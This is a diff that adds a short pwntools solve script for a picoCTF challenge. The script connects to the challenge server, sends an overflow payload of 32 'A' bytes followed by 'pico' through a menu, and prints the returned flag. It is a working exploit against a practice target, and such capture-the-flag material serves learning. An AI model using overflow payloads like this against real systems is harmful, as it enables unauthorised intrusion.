@@ -1,0 +1,17 @@
+from pwn import *
+
+context.binary = elf = ELF("./chall", checksec=False)
+#io = elf.process()
+io = remote("tethys.picoctf.net", 50255)
+#context.log_level = "debug"
+
+payload = b'A' * 32 + b'pico'
+io.sendlineafter(b": ", b"2")
+io.sendlineafter(b": ", payload)
+io.sendlineafter(b": ", b"4")
+io.recvuntil(b"YOU WIN\n")
+flag = io.recvline().strip().decode()
+
+log.success(flag)
+
+io.close()
